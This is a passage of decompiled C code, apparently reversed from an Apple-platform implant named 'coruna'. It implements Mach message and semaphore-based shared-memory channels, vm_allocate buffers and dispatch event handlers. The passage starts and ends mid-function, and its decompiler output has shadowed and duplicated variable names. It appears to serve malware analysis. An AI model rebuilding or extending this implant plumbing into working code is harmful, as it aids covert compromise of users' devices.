  arg[0x4d] = 0;
  arg[0x42] = 0;
  arg[0x43] = 0;
  arg[0x40] = 0;
  arg[0x41] = 0;
  arg[0x46] = 0;
  arg[0x47] = 0;
  arg[0x44] = 0;
  arg[0x45] = 0;
  arg[0x3a] = 0;
  arg[0x3b] = 0;
  arg[0x38] = 0;
  arg[0x39] = 0;
  arg[0x3e] = 0;
  arg[0x3f] = 0;
  arg[0x3c] = 0;
  arg[0x3d] = 0;
  arg[0x32] = 0;
  arg[0x33] = 0;
  arg[0x30] = 0;
  arg[0x31] = 0;
  arg[0x36] = 0;
  arg[0x37] = 0;
  arg[0x34] = 0;
  arg[0x35] = 0;
  arg[0x2a] = 0;
  arg[0x2b] = 0;
  arg[0x28] = 0;
  arg[0x29] = 0;
  arg[0x2e] = 0;
  arg[0x2f] = 0;
  arg[0x2c] = 0;
  arg[0x2d] = 0;
  arg[0x22] = 0;
  arg[0x23] = 0;
  arg[0x20] = 0;
  arg[0x21] = 0;
  arg[0x26] = 0;
  arg[0x27] = 0;
  arg[0x24] = 0;
  arg[0x25] = 0;
  arg[0x1a] = 0;
  arg[0x1b] = 0;
  arg[0x18] = 0;
  arg[0x19] = 0;
  arg[0x1e] = 0;
  arg[0x1f] = 0;
  arg[0x1c] = 0;
  arg[0x1d] = 0;
  arg[0x12] = 0;
  arg[0x13] = 0;
  arg[0x10] = 0;
  arg[0x11] = 0;
  arg[0x16] = 0;
  arg[0x17] = 0;
  arg[0x14] = 0;
  arg[0x15] = 0;
  arg[10] = 0;
  arg[0xb] = 0;
  arg[8] = 0;
  arg[9] = 0;
  arg[0xe] = 0;
  arg[0xf] = 0;
  arg[0xc] = 0;
  arg[0xd] = 0;
  arg[2] = 0;
  arg[3] = 0;
  arg[0] = 0;
  arg[1] = 0;
  arg[6] = 0;
  arg[7] = 0;
  arg[4] = 0;
  arg[5] = 0;
  return;
}
void coruna_semaphore_signal(uint64_t val,uint64_t id_2,void *ctx,size_t len,int flags,
                 long handle,uint64_t *size_3,long addr_2)
{
  semaphore_t semaphore;
  uint32_t u;
  kern_return_t lk2;
  time_t lt3;
  time_t lt4;
  semaphore_t *lps5;
  double ld6;
  
  if (*(uint64_t **)(handle + 200) == size_3) {
    lps5 = (semaphore_t *)(handle + 0x18);
  }
  else {
    if (*(uint64_t **)(handle + 0xf8) != size_3) {
      return;
    }
    lps5 = (semaphore_t *)(handle + 0x10);
  }
  semaphore = *lps5;
  *size_3 = val;
  *(uint64_t *)((long)size_3 + (unsigned long)*(uint *)(handle + 0x14c)) = id_2;
  _memcpy((void *)((long)size_3 + addr_2 + (unsigned long)*(uint *)(handle + 0x150)),ctx,len);
  lk2 = _semaphore_signal(semaphore);
  if (lk2 == 0) {
    if (flags == 0) {
fail:
      _bzero(ctx,len);
    }
    else {
      lt3 = _time((time_t *)0x0);
      u = k_implant_float_const_001;
      do {
        if (*(long *)((long)size_3 + (unsigned long)*(uint *)(handle + 0x14c)) == 0x80000000)
        goto fail;
        coruna_nanosleep(u);
        lt4 = _time((time_t *)0x0);
        ld6 = _difftime(lt4,lt3);
      } while (ld6 < 2.0);
    }
  }
  return;
}
void coruna_mach_msg(mach_port_name_t *arg,int flags)
{
  mach_port_name_t rcv_name;
  mach_msg_bits_t lm1;
  int err;
  mach_msg_header_t *msg;
  mach_port_name_t *lpm3;
  uint8_t *ptr;
  mach_port_name_t *lpm5;
  mach_port_name_t *lpm6;
  
  if (flags == 1) {
    lpm5 = arg + 6;
    lpm6 = arg + 7;
    lpm3 = arg;
  }
  else {
    if (flags != 2) {
      return;
    }
    lpm3 = arg + 0x41;
    lpm5 = arg + 4;
    lpm6 = arg + 5;
  }
  rcv_name = *lpm3;
  ptr = &k_implant_branch_mask;
  msg = _malloc(0x1044);
  while( true ) {
    do {
      err = _mach_msg(msg,0x806,0,(mach_msg_size_t)ptr,rcv_name,0,0);
    } while (err == 0x10004003);
    if (err == 0x10004004) {
      ptr = (uint8_t *)(unsigned long)(msg->msgh_size + 0x44);
      msg = _realloc(msg,(size_t)ptr);
      err = _mach_msg(msg,0x806,0,msg->msgh_size + 0x44,rcv_name,0,0);
    }
    if (err != 0) break;
    lm1 = msg[1].msgh_bits;
    if (lm1 == 2) {
      *lpm5 = msg[1].msgh_size;
      *lpm6 = msg[1].msgh_reserved;
      _free(msg);
      return;
    }
    if (lm1 == 1 && flags == 2) {
      arg[0x42] = msg[1].msgh_size;
    }
    else {
      if (lm1 != 1 || flags != 1) {
        _free(msg);
        return;
      }
      arg[0x35] = msg[1].msgh_size;
    }
  }
  _free(msg);
  return;
}
void coruna_dispatch_source_set_event_handler(long handle)
{
  uint64_t u;
  uint64_t size;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  
  _dispatch_suspend(**(dispatch_object_t **)(handle + 8));
  size = **(uint64_t **)(handle + 8);
  scratch = k_implant_nsconcretestackblock_slot;
  bootargs = k_implant_reloc_tag_d;
  thread_attr = coruna_call_mach_msg;
  host_info = &k_implant_slot_a;
  serial_buf = handle;
  u = coruna_implant6dec_via_pacia_3_2(&scratch);
  _dispatch_source_set_event_handler(size,u);
  _dispatch_resume(**(dispatch_object_t **)(handle + 8));
  return;
}
void coruna_call_mach_msg(long handle)
{
  coruna_mach_msg(*(uint64_t *)(handle + 0x20),1);
  return;
}
void coruna_vm_deallocate(uint64_t val,void *ctx,size_t len,uint *size,long handle,
                 mach_port_t port)
{
  uint8_t *ptr;
  uint64_t *buf;
  unsigned long u;
  mach_msg_id_t lm4;
  uint size;
  uint8_t *str;
  kern_return_t lk7;
  unsigned long version;
  long handle;
  unsigned long port;
  uint64_t tag;
  uint kind;
  mach_msg_bits_t lm13;
  void *scratch;
  mach_msg_header_t *bootargs;
  
  port = len + 0x18;
  size = *size;
  version = (unsigned long)size;
  u = version << 4 | 4;
  if (size == 0) {
    u = 0;
  }
  ptr = (uint8_t *)(u + port);
  if (version == 0 && ptr < &UNK_00001001) {
    lm13 = 0x13;
  }
  else {
    if ((uint8_t *)0x1000 < ptr) {
      size = size + 1;
    }
    *size = size;
    port = (port & 0xffffffff) + (unsigned long)size * 0x10 + 4;
    lm13 = 0x80000013;
  }
  str = k_implant_mach_task_self_slot;
  size = (int)port + 3U & 0xfffffffc;
  bootargs = (mach_msg_header_t *)0x0;
  lk7 = _vm_allocate(*(vm_map_t *)k_implant_mach_task_self_slot,(vm_address_t *)&bootargs,
                       (unsigned long)size,3);
  if (lk7 != 0) {
    return;
  }
  lm4 = 0xdba1dba;
  if (ptr < &UNK_00001001) {
    lm4 = 0xdba0dba;
  }
  bootargs->msgh_bits = lm13;
  bootargs->msgh_size = size;
  bootargs->msgh_remote_port = port;
  bootargs->msgh_local_port = 0;
  bootargs->msgh_id = lm4;
  if (version == 0 && ptr < &UNK_00001001) {
    kind = 0x18;
  }
  else {
    bootargs[1].msgh_bits = *size;
    if (*size == (uint)((uint8_t *)0x1000 < ptr)) {
      kind = 0x1c;
    }
    else {
      handle = 0;
      port = 0;
      do {
        buf = (uint64_t *)((long)&bootargs->msgh_bits + (unsigned long)((int)handle + 0x1c));
        tag = *(uint64_t *)(handle + handle);
        *(uint32_t *)(buf + 1) = *(uint32_t *)((uint64_t *)(handle + handle) + 1);
        *buf = tag;
        port = port + 1;
        handle = handle + 0xc;
      } while (port < *size - (uint)((uint8_t *)0x1000 < ptr));
      kind = (int)handle + 0x1c;
    }
    if (&UNK_00001001 <= ptr) {
      scratch = (void *)0x0;
      lk7 = _vm_allocate(*(vm_map_t *)str,(vm_address_t *)&scratch,len,3);
      if (lk7 != 0) {
        return;
      }
      _memcpy(scratch,ctx,len);
      buf = (uint64_t *)((long)&bootargs->msgh_bits + (unsigned long)kind);
      *buf = scratch;
      *(uint32_t *)(buf + 1) = 0x1000100;
      *(int *)((long)buf + 0xc) = (int)len;
      goto fail;
    }
  }
  _memcpy((void *)((long)&bootargs->msgh_bits + (unsigned long)kind),ctx,len);
fail:
  _mach_msg(bootargs,0x81,size,0,0,0,0);
  _bzero(ctx,len);
  _vm_deallocate(*(vm_map_t *)str,(vm_address_t)bootargs,(unsigned long)size);
  return;
}
void coruna_implant6dec_via_u64_pack_3(long handle)
{
  uint16_t *ptr;
  uint64_t u;
  uint32_t scratch[2];
  uint32_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint32_t serial_buf;
  long action;
  
  action = *(long *)k_implant_stack_chk_guard_slot;
  host_info = 0;
  thread_attr = 0;
  ptr = _malloc(0x1000);
  *ptr = 0;
  ptr[1] = *(uint16_t *)(handle + 0x124);
  *(uint32_t *)(ptr + 2) = 0;
  *(uint64_t *)(ptr + 4) = 0;
  u = *(uint64_t *)(handle + 0x30);
  *(uint64_t *)(ptr + 0xc) = *(uint64_t *)(handle + 0x38);
  *(uint64_t *)(ptr + 8) = u;
  u = *(uint64_t *)(handle + 0xf0);
  *(uint64_t *)(ptr + 0x10) = *(uint64_t *)(handle + 0x40);
  *(uint64_t *)(ptr + 0x14) = u;
  *(uint64_t *)(ptr + 0x18) = u;
  scratch[0] = 2;
  bootargs = *(uint32_t *)(handle + 0x104);
  thread_attr = coruna_u64_pack((0x130000), ((uint32_t))thread_attr);
  host_info = coruna_u64_pack((host_info), (*(uint32_t *))(handle + 0x100));
  serial_buf = 0x130000;
  coruna_vm_deallocate(ptr,ptr,0x38,scratch,&bootargs,*(uint32_t *)(handle + 4));
  _free(ptr);
  if (*(long *)k_implant_stack_chk_guard_slot == action) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_semaphore_timedwait_e674(uint32_t size,uint32_t flags_2,uint32_t version_3,long handle,
                 unsigned long arg,uint8_t buf,uint8_t data_2,uint64_t val,
                 uint8_t bytes_3,unsigned long arg)
{
  unsigned long *ptr;
  long handle;
  semaphore_t semaphore;
  uint64_t u;
  kern_return_t lk4;
  unsigned long *buf;
  long addr;
  uint64_t *str;
  unsigned long size;
  unsigned long version;
  unsigned long port;
  
  buf = _malloc(0x1000);
  *buf = (unsigned long)*(ushort *)(handle + 0x120);
  buf[1] = arg;
  *(uint *)(buf + 2) = (uint)*(ushort *)(handle + 0x132);
  *(uint32_t *)((long)buf + 0x14) = size;
  *(uint32_t *)(buf + 3) = flags_2;
  *(uint8_t *)((long)buf + 0x1c) = buf;
  *(uint8_t *)((long)buf + 0x1d) = data_2;
  *(uint32_t *)(buf + 4) = version_3;
  *(uint8_t *)((long)buf + 0x24) = 0;
  size = k_implant_map_size_page;
  buf[6] = k_implant_rodata_word_00012b98;
  buf[5] = size;
  *(uint8_t *)(buf + 9) = 0x42;
  u = s_kCGColorSpaceSRGB_00013e5a._0_8_;
  buf[8] = s_kCGColorSpaceSRGB_00013e5a._8_8_;
  buf[7] = u;
  *(uint8_t *)((long)buf + 0x49) = bytes_3;
  buf[10] = arg;
  addr = *(long *)(handle + 0x20);
  str = *(uint64_t **)(handle + 0xf8);
  handle = 0x18;
  if (*(uint64_t **)(handle + 200) != str) {
    handle = 0x10;
  }
  semaphore = *(semaphore_t *)(handle + handle);
  *str = 0x80000000;
  *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = addr + 0x58;
  ptr = (unsigned long *)((long)str + addr + (unsigned long)*(uint *)(handle + 0x150));
  size = buf[4];
  port = buf[7];
  version = buf[6];
  ptr[5] = buf[5];
  ptr[4] = size;
  ptr[7] = port;
  ptr[6] = version;
  size = buf[8];
  ptr[9] = buf[9];
  ptr[8] = size;
  ptr[10] = arg;
  size = *buf;
  port = buf[3];
  version = buf[2];
  ptr[1] = buf[1];
  *ptr = size;
  ptr[3] = port;
  ptr[2] = version;
  _semaphore_signal(semaphore);
  lk4 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x14),(mach_timespec_t)0x2);
  if (lk4 != 0x31) {
    *(long *)(handle + 0x20) = *(long *)(handle + 0x20) + 0x58;
    _free(buf);
  }
  return;
}
void coruna_helper_a400_e7f8(long handle,long addr_2)
{
  long handle;
  uint16_t *ptr;
  unsigned long *buf;
  unsigned long u;
  
  buf = _malloc(0x1000);
  if (*(long *)(handle + 0x50) == addr_2) {
    u = *(unsigned long *)(handle + 0x48);
    *buf = (unsigned long)*(ushort *)(handle + 0x120);
    buf[1] = u;
    u = 0x10;
  }
  else {
    u = 0;
  }
  ptr = (uint16_t *)((long)buf + u);
  *ptr = *(uint16_t *)(handle + 0x128);
  handle = *(long *)(handle + 0x70) + 1;
  *(long *)((long)buf + (u | 2)) = handle;
  *(long *)(handle + 0x70) = handle;
  *(uint64_t *)((long)buf + (u | 10)) = 1;
  *(uint8_t *)(ptr + 9) = 1;
  *(long *)(ptr + 0xc) = addr_2;
  coruna_semaphore_signal(0,*(long *)(handle + 0x28) + (u | 0x20),buf,u | 0x20,1,handle,
               *(uint64_t *)(handle + 200));
  *(uint64_t *)(handle + 0x28) = 0;
  _free(buf);
  return;
}
void coruna_implant6dec_via_semaphore_signal(long handle)
{
  unsigned long *ptr;
  unsigned long u;
  
  ptr = _malloc(0x1000);
  u = *(unsigned long *)(handle + 0x50);
  *ptr = (unsigned long)*(ushort *)(handle + 0x120);
  ptr[1] = u;
  *(uint16_t *)(ptr + 2) = *(uint16_t *)(handle + 0x12a);
  u = *(long *)(handle + 0x70) + 1;
  *(unsigned long *)(handle + 0x70) = u;
  ptr[3] = u;
  *(uint32_t *)(ptr + 4) = 0xffffffff;
  *(uint64_t *)((long)ptr + 0x2c) = 0;
  *(uint64_t *)((long)ptr + 0x24) = 0;
  *(uint32_t *)((long)ptr + 0x34) = 0;
  u = *(unsigned long *)(handle + 0x58);
  ptr[8] = *(unsigned long *)(handle + 0x60);
  ptr[7] = u;
  coruna_semaphore_signal(0,*(long *)(handle + 0x28) + 0x48,ptr,0x48,1,handle,
               *(uint64_t *)(handle + 200));
  *(uint64_t *)(handle + 0x28) = 0;
  _free(ptr);
  return;
}
void coruna_semaphore_timedwait_e9b0(long handle,uint16_t arg,uint8_t buf,unsigned long arg_x,unsigned long arg)
{
  unsigned long *ptr;
  semaphore_t semaphore;
  kern_return_t lk2;
  unsigned long *buf;
  long handle;
  unsigned long u;
  uint64_t *str;
  unsigned long size;
  unsigned long version;
  
  buf = _malloc(0x1000);
  u = *(unsigned long *)(handle + 0x58);
  *buf = (unsigned long)*(ushort *)(handle + 0x120);
  buf[1] = u;
  *(uint *)(buf + 2) = (uint)*(ushort *)(handle + 300);
  *(uint32_t *)((long)buf + 0x14) = 0xffffffff;
  buf[3] = arg_x;
  *(uint16_t *)(buf + 4) = arg;
  *(uint8_t *)((long)buf + 0x22) = buf;
  buf[5] = arg;
  handle = *(long *)(handle + 0x28);
  str = *(uint64_t **)(handle + 200);
  semaphore = *(semaphore_t *)(handle + 0x18);
  *str = 0x80000000;
  *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 0x30;
  ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
  u = *buf;
  version = buf[3];
  size = buf[2];
  ptr[1] = buf[1];
  *ptr = u;
  ptr[3] = version;
  ptr[2] = size;
  u = buf[4];
  ptr[5] = buf[5];
  ptr[4] = u;
  _semaphore_signal(semaphore);
  lk2 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x1c),(mach_timespec_t)0x2);
  if (lk2 != 0x31) {
    *(long *)(handle + 0x28) = *(long *)(handle + 0x28) + 0x30;
    _free(buf);
  }
  return;
}
void coruna_implant6dec_via_semaphore_signal_2(long handle,unsigned long arg,unsigned long arg,unsigned long val,uint64_t val)
{
  long handle;
  unsigned long *ptr;
  unsigned long *buf;
  unsigned long u;
  
  buf = _malloc(0x1000);
  if (*(int *)(handle + 0x78) == 0) {
    *buf = (unsigned long)*(ushort *)(handle + 0x120);
    buf[1] = arg;
    u = 0x10;
  }
  else {
    u = 0;
  }
  ptr = (unsigned long *)((long)buf + u);
  *ptr = (unsigned long)*(ushort *)(handle + 0x12e);
  handle = *(long *)(handle + 0x70) + 1;
  *(long *)(handle + 0x70) = handle;
  *(long *)((long)buf + (u | 8)) = handle;
  ptr[2] = arg;
  ptr[3] = val;
  ptr[4] = 1;
  *(uint64_t *)((long)buf + (u | 0x28)) = val;
  coruna_semaphore_signal(0,*(long *)(handle + 0x28) + u + 0x30,buf,u + 0x30,1,handle,
               *(uint64_t *)(handle + 200));
  *(uint64_t *)(handle + 0x28) = 0;
  _free(buf);
  return;
}
void coruna_semaphore_timedwait_ebbc(long handle,unsigned long arg,void *ctx,size_t len)
{
  semaphore_t ls1;
  unsigned long *ptr;
  kern_return_t lk3;
  unsigned long *buf;
  long handle;
  uint64_t *str;
  unsigned long u;
  
  buf = _malloc(len + 0x20);
  if (*(int *)(handle + 0x78) == 0) {
    *buf = (unsigned long)*(ushort *)(handle + 0x120);
    buf[1] = arg;
    handle = *(long *)(handle + 0x28);
    str = *(uint64_t **)(handle + 200);
    *str = 0;
    *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 0x10;
    ls1 = *(semaphore_t *)(handle + 0x18);
    u = *buf;
    ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
    ptr[1] = buf[1];
    *ptr = u;
    _semaphore_signal(ls1);
    *(long *)(handle + 0x28) = *(long *)(handle + 0x28) + 0x10;
  }
  *buf = (unsigned long)*(ushort *)(handle + 0x130);
  buf[1] = len;
  if (len == 0) {
    len = 0x10;
  }
  else {
    _memcpy(buf + 2,ctx,len);
    len = len + 0x10;
  }
  handle = *(long *)(handle + 0x28);
  str = *(uint64_t **)(handle + 200);
  ls1 = *(semaphore_t *)(handle + 0x18);
  *str = 0x80000000;
  *(size_t *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + len;
  _memcpy((void *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150)),buf,len);
  _semaphore_signal(ls1);
  lk3 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x1c),(mach_timespec_t)0x2);
  if (lk3 != 0x31) {
    *(size_t *)(handle + 0x28) = *(long *)(handle + 0x28) + len;
    _free(buf);
  }
  return;
}
void coruna_semaphore_timedwait_ed18(long handle,unsigned long arg,unsigned long arg,uint8_t buf,uint32_t size,
                 uint32_t flags_2,uint32_t version_3,uint32_t count_4)
{
  unsigned long u;
  uint64_t size;
  kern_return_t lk3;
  unsigned long *ptr;
  uint32_t scratch[2];
  uint8_t bootargs[8];
  
  ptr = _malloc(0x1000);
  *(uint16_t *)ptr = 0;
  *(uint16_t *)((long)ptr + 2) = *(uint16_t *)(handle + 0x134);
  *(uint32_t *)((long)ptr + 4) = 0;
  u = *(long *)(handle + 0x70) + 1;
  *(unsigned long *)(handle + 0x70) = u;
  ptr[1] = arg;
  ptr[2] = u;
  ptr[3] = arg;
  *(uint8_t *)(ptr + 4) = 0;
  *(uint8_t *)((long)ptr + 0x21) = buf;
  *(uint8_t *)((long)ptr + 0x22) = 0;
  *(uint32_t *)((long)ptr + 0x24) = 0;
  ptr[5] = 0x11;
  *(uint8_t *)(ptr + 8) = 0x42;
  size = s_kCGColorSpaceSRGB_00013e5a._0_8_;
  ptr[7] = s_kCGColorSpaceSRGB_00013e5a._8_8_;
  ptr[6] = size;
  *(uint32_t *)((long)ptr + 0x44) = size;
  *(uint32_t *)(ptr + 9) = flags_2;
  *(uint32_t *)((long)ptr + 0x4c) = version_3;
  *(uint32_t *)(ptr + 10) = count_4;
  scratch[0] = 0;
  coruna_vm_deallocate(ptr,ptr,0x54,scratch,bootargs,*(uint32_t *)(handle + 0x108));
  ptr[3] = 0;
  ptr[2] = 0;
  ptr[5] = 0;
  ptr[4] = 0;
  ptr[7] = 0;
  ptr[6] = 0;
  ptr[9] = 0;
  ptr[8] = 0;
  *(uint32_t *)(ptr + 10) = 0;
  *ptr = (unsigned long)*(ushort *)(handle + 0x122);
  ptr[1] = 0;
  coruna_semaphore_signal(0x80000000,*(long *)(handle + 0x20) + 0x10,ptr,0x10,1,handle,
               *(uint64_t *)(handle + 0xf8));
  lk3 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x14),(mach_timespec_t)0x2);
  if (lk3 != 0x31) {
    *(long *)(handle + 0x20) = *(long *)(handle + 0x20) + 0x10;
    _free(ptr);
  }
  return;
}
void coruna_semaphore_timedwait_ee94(long handle,unsigned long arg,unsigned long arg,uint8_t buf,uint32_t size,
                 uint32_t flags_2,uint32_t version_3,uint32_t count_4)
{
  unsigned long u;
  unsigned long *ptr;
  long handle;
  semaphore_t semaphore;
  uint64_t size;
  kern_return_t lk5;
  unsigned long *buf;
  long addr;
  uint64_t *str;
  uint32_t scratch[2];
  uint8_t bootargs[8];
  
  buf = _malloc(0x1000);
  *(uint16_t *)buf = 0;
  *(uint16_t *)((long)buf + 2) = *(uint16_t *)(handle + 0x134);
  *(uint32_t *)((long)buf + 4) = 0;
  u = *(long *)(handle + 0x70) + 1;
  *(unsigned long *)(handle + 0x70) = u;
  buf[1] = arg;
  buf[2] = u;
  buf[3] = arg;
  *(uint8_t *)(buf + 4) = 0;
  *(uint8_t *)((long)buf + 0x21) = buf;
  *(uint8_t *)((long)buf + 0x22) = 0;
  *(uint32_t *)((long)buf + 0x24) = 0;
  buf[5] = 0x11;
  *(uint8_t *)(buf + 8) = 0x42;
  size = s_kCGColorSpaceSRGB_00013e5a._0_8_;
  buf[7] = s_kCGColorSpaceSRGB_00013e5a._8_8_;
  buf[6] = size;
  *(uint32_t *)((long)buf + 0x44) = size;
  *(uint32_t *)(buf + 9) = flags_2;
  *(uint32_t *)((long)buf + 0x4c) = version_3;
  *(uint32_t *)(buf + 10) = count_4;
  scratch[0] = 0;
  coruna_vm_deallocate(buf,buf,0x54,scratch,bootargs,*(uint32_t *)(handle + 0x108));
  *(uint64_t *)((long)buf + 0x4c) = 0;
  *(uint64_t *)((long)buf + 0x44) = 0;
  *(uint64_t *)((long)buf + 0x42) = 0;
  *(uint64_t *)((long)buf + 0x3a) = 0;
  *(uint64_t *)((long)buf + 0x32) = 0;
  *(uint64_t *)((long)buf + 0x2a) = 0;
  *(uint64_t *)((long)buf + 0x22) = 0;
  *(uint64_t *)((long)buf + 0x1a) = 0;
  *(uint64_t *)((long)buf + 0x12) = 0;
  *(uint64_t *)((long)buf + 10) = 0;
  *buf = (unsigned long)*(ushort *)(handle + 0x122);
  *(uint16_t *)(buf + 1) = 0;
  addr = *(long *)(handle + 0x20);
  str = *(uint64_t **)(handle + 0xf8);
  handle = 0x18;
  if (*(uint64_t **)(handle + 200) != str) {
    handle = 0x10;
  }
  semaphore = *(semaphore_t *)(handle + handle);
  *str = 0x80000000;
  *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = addr + 10;
  ptr = (unsigned long *)((long)str + addr + (unsigned long)*(uint *)(handle + 0x150));
  u = buf[1];
  *ptr = *buf;
  *(short *)(ptr + 1) = (short)u;
  lk5 = _semaphore_signal(semaphore);
  if (lk5 == 0) {
    *(uint16_t *)(buf + 1) = 0;
    *buf = 0;
  }
  lk5 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x14),(mach_timespec_t)0x2);
  if (lk5 != 0x31) {
    *(long *)(handle + 0x20) = *(long *)(handle + 0x20) + 10;
    _free(buf);
  }
  return;
}
void coruna_semaphore_timedwait_f060(long handle,unsigned long arg,int flags)
{
  semaphore_t semaphore;
  ushort u;
  unsigned long *ptr;
  kern_return_t lk3;
  unsigned long *buf;
  long handle;
  uint64_t *str;
  unsigned long size;
  uint32_t scratch[2];
  uint8_t bootargs[8];
  
  buf = _malloc(0x1000);
  *(uint16_t *)buf = 0;
  *(uint16_t *)((long)buf + 2) = *(uint16_t *)(handle + 0x13c);
  *(uint32_t *)((long)buf + 4) = 0;
  buf[1] = *(unsigned long *)(handle + 0x58);
  buf[2] = 0xffffffff;
  buf[3] = 0;
  buf[4] = arg;
  scratch[0] = 0;
  handle = 0xd4;
  if (*(int *)(handle + 0x148) != 0x100400) {
    handle = 4;
  }
  coruna_vm_deallocate(buf,buf,0x28,scratch,bootargs,*(uint32_t *)(handle + handle));
  buf[3] = 0;
  buf[4] = 0;
  u = *(ushort *)(handle + 0x122);
  buf[1] = 0;
  buf[2] = 0;
  *buf = (unsigned long)u;
  handle = *(long *)(handle + 0x28);
  str = *(uint64_t **)(handle + 200);
  semaphore = *(semaphore_t *)(handle + 0x18);
  if (flags == 0) {
    *str = 0;
    *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 0x10;
    size = *buf;
    ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
    ptr[1] = buf[1];
    *ptr = size;
    _semaphore_signal(semaphore);
  }
  else {
    *str = 0x80000000;
    *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 0x10;
    size = *buf;
    ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
    ptr[1] = buf[1];
    *ptr = size;
    _semaphore_signal(semaphore);
    lk3 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x1c),(mach_timespec_t)0x2);
    if (lk3 == 0x31) {
      return;
    }
  }
  *(long *)(handle + 0x28) = *(long *)(handle + 0x28) + 0x10;
  _free(buf);
  return;
}
void coruna_semaphore_timedwait_f1cc(long handle,unsigned long arg,int flags)
{
  semaphore_t semaphore;
  ushort u;
  unsigned long *ptr;
  kern_return_t lk3;
  unsigned long *buf;
  long handle;
  uint64_t *str;
  unsigned long size;
  uint32_t scratch[2];
  uint8_t bootargs[8];
  
  buf = _malloc(0x1000);
  *(uint16_t *)buf = 0;
  *(uint16_t *)((long)buf + 2) = *(uint16_t *)(handle + 0x13a);
  *(uint32_t *)((long)buf + 4) = 0;
  buf[1] = *(unsigned long *)(handle + 0x58);
  buf[2] = 0xffffffff;
  buf[3] = 0;
  buf[4] = arg;
  scratch[0] = 0;
  handle = 0xd4;
  if (*(int *)(handle + 0x148) != 0x100400) {
    handle = 4;
  }
  coruna_vm_deallocate(buf,buf,0x28,scratch,bootargs,*(uint32_t *)(handle + handle));
  buf[3] = 0;
  buf[4] = 0;
  u = *(ushort *)(handle + 0x122);
  buf[1] = 0;
  buf[2] = 0;
  *buf = (unsigned long)u;
  handle = *(long *)(handle + 0x28);
  str = *(uint64_t **)(handle + 200);
  semaphore = *(semaphore_t *)(handle + 0x18);
  if (flags == 0) {
    *str = 0;
    *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 0x10;
    size = *buf;
    ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
    ptr[1] = buf[1];
    *ptr = size;
    _semaphore_signal(semaphore);
  }
  else {
    *str = 0x80000000;
    *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 0x10;
    size = *buf;
    ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
    ptr[1] = buf[1];
    *ptr = size;
    _semaphore_signal(semaphore);
    lk3 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x1c),(mach_timespec_t)0x2);
    if (lk3 == 0x31) {
      return;
    }
  }
  *(long *)(handle + 0x28) = *(long *)(handle + 0x28) + 0x10;
  _free(buf);
  return;
}
void coruna_semaphore_timedwait_f338(long handle,uint64_t val,int flags)
{
  semaphore_t semaphore;
  ushort u;
  unsigned long *ptr;
  kern_return_t lk3;
  unsigned long *buf;
  long handle;
  uint64_t *str;
  unsigned long size;
  uint32_t scratch[2];
  uint8_t bootargs[8];
  
  buf = _malloc(0x1000);
  *(uint16_t *)buf = 0;
  *(uint16_t *)((long)buf + 2) = *(uint16_t *)(handle + 0x13e);
  *(uint32_t *)((long)buf + 4) = 0;
  buf[1] = *(unsigned long *)(handle + 0x58);
  buf[2] = 0;
  *(uint32_t *)(buf + 3) = 0;
  *(uint64_t *)((long)buf + 0x1c) = val;
  scratch[0] = 0;
  handle = 0xd4;
  if (*(int *)(handle + 0x148) != 0x100400) {
    handle = 4;
  }
  coruna_vm_deallocate(buf,buf,0x24,scratch,bootargs,*(uint32_t *)(handle + handle));
  *(uint32_t *)(buf + 4) = 0;
  u = *(ushort *)(handle + 0x122);
  buf[2] = 0;
  buf[3] = 0;
  *buf = (unsigned long)u;
  buf[1] = 0;
  handle = *(long *)(handle + 0x28);
  str = *(uint64_t **)(handle + 200);
  semaphore = *(semaphore_t *)(handle + 0x18);
  if (flags == 0) {
    *str = 0;
    *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 0x10;
    size = *buf;
    ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
    ptr[1] = buf[1];
    *ptr = size;
    _semaphore_signal(semaphore);
  }
  else {
    *str = 0x80000000;
    *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 0x10;
    size = *buf;
    ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
    ptr[1] = buf[1];
    *ptr = size;
    _semaphore_signal(semaphore);
    lk3 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x1c),(mach_timespec_t)0x2);
    if (lk3 == 0x31) {
      return;
    }
  }
  *(long *)(handle + 0x28) = *(long *)(handle + 0x28) + 0x10;
  _free(buf);
  return;
}
void coruna_semaphore_timedwait_f4a0(long handle,unsigned long arg,int flags)
{
  unsigned long *ptr;
  semaphore_t semaphore;
  kern_return_t lk2;
  unsigned long *buf;
  long handle;
  uint64_t *str;
  uint32_t scratch[2];
  uint8_t bootargs[8];
  
  buf = _malloc(0x1000);
  *(uint16_t *)buf = 0;
  *(uint16_t *)((long)buf + 2) = *(uint16_t *)(handle + 0x13a);
  *(uint32_t *)((long)buf + 4) = 0;
  buf[1] = *(unsigned long *)(handle + 0x58);
